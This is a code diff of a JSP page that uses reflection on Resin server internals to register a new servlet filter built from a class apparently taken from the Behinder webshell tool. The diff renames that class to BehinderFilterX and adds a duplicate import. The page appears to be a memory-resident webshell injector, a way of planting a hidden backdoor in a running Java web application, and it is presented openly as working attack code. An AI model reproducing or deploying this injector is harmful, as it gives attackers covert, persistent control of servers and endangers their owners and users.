@@ -2,11 +2,12 @@
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%@ page import = "com.caucho.server.webapp.WebApp" %>
 <%@ page import="com.caucho.server.dispatch.FilterConfigImpl" %>
-<%@ page import="com.sorry.bug.BehinderFilter" %>
+<%@ page import="com.sorry.bug.BehinderFilterX" %>
 <%@ page import="com.caucho.server.dispatch.FilterMapping" %>
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="com.caucho.server.dispatch.FilterMapper" %>
 <%@ page import="java.util.ArrayList" %>
+<%@ page import="com.sorry.bug.BehinderFilterX" %>
 <%
   ClassLoader classloader = Thread.currentThread().getContextClassLoader();
   Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
@@ -18,7 +19,7 @@
   WebApp webapp = (WebApp)contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
 
   String newFilterStr = "newfilter";
-  Filter newFilter = new BehinderFilter();
+  Filter newFilter = new BehinderFilterX();
   FilterConfigImpl filterConfigimpl = (FilterConfigImpl)filterConfigimplcls.newInstance();
   filterConfigimpl.setFilterName(newFilterStr);
   filterConfigimpl.setFilterClass(newFilter.getClass().getName());
